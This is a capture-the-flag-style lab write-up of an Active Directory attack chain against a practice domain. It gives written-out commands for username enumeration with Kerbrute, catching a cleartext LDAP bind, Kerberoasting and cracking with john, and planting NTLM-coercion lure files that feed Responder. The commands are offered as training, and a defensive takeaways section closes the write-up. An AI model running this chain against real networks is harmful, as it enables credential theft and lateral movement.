City Council

Hack Smarter · Active Directory · Black box. No credentials to start — just a website. Harvest names, prove accounts exist, pull a password out of network traffic, then Kerberoast and coerce a hash to move laterally.

A Hack Smarter lab, shared with permission. Credentials, hashes, and flag values are redacted. This is a realism lab: the goal is breadth of findings, not a race to Domain Admin.

1. From a Website to a User List

Starting black box, the DC exposes the usual AD ports plus an IIS site on 80. The site is a city-hall front page that names staff. Turn those names into candidate usernames with username-anarchy, then validate which ones are real accounts with Kerbrute — pre-auth username enumeration that needs no password.

username-anarchy -i names.txt > usernames.txt
kerbrute userenum -d DOMAIN --dc DC usernames.txt

A handful of names come back valid. Now we have real accounts but no passwords.

2. A Password in the Traffic

Submitting a form on the site makes the server bind to the DC over LDAP. Capturing that in Wireshark reveals a service account authenticating in cleartext — a simple LDAP bind with the password in the packet.

# Wireshark display filter
ldap || tcp.port == 389

Alternatively, point the application's DC name at your own host and catch the bind on a listener — same result, the service account's credentials.

sudo nc -lvnp 389   # app binds here; read the credentials

3. Map the Domain and Kerberoast

With the service account, collect BloodHound data and enumerate users over LDAP, then request service tickets for any account with an SPN (Kerberoasting) and crack them offline.

nxc ldap DC -u svc_portal -p PASS --bloodhound --collection all --dns-server DC
GetUserSPNs.py DOMAIN/svc_portal:PASS -dc-ip DC -request
john spns.txt --wordlist=/usr/share/wordlists/rockyou.txt

One SPN account cracks, and its password unlocks a share set with read/write for us — an uploads folder that staff open.

4. Coerce an NTLM Hash to Move Laterally

A writable share that others browse is an NTLM-coercion opportunity. Seed it with files that force any user who opens the folder to authenticate to us, run Responder to catch the hash, and crack it.

ntlm_theft -g all -s YOUR_IP -f important      # build the lure files
sudo responder -I tun0                          # capture NTLMv2
smbclient -W DOMAIN -U svc_portal //DC/Uploads/ # upload the lures (mput *)
john captured.hash --wordlist=/usr/share/wordlists/rockyou.txt

A staff user's NTLMv2 hash lands in Responder and cracks, giving a fresh account to pivot through. From here the engagement continues account by account — exactly the “how many findings can you surface” framing the brief asked for.

What To Take Away

  • A public staff page is a username list. Kerbrute confirms which names are real accounts without touching a password.
  • Watch the traffic. Applications that bind to the DC can leak service credentials in cleartext LDAP.
  • Kerberoast every SPN account; service passwords are often weak and crack fast.
  • A writable share others browse lets you coerce NTLM authentication. Lock down write access and disable legacy name resolution.
